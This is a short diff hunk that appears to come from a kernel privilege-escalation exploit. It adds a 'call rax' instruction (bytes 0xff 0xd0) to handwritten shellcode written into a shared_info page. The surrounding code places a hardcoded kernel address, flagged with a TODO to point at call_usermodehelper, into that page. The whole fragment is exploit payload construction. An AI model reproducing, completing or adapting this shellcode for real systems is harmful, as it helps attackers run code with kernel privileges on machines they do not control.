@@ -305,6 +305,10 @@ static inline void shared_info_write_page(char *base)
         *(u32*)base = (u32)(gilkup_vars.kernel_base + 0x097830); //TODO: replace with your call_usermodehelper
         base += sizeof(u32);
 
+	// call rax
+        *(base++) = 0xff;
+        *(base++) = 0xd0;
+
 	// pop rax
         *(base++) = 0x58;
 
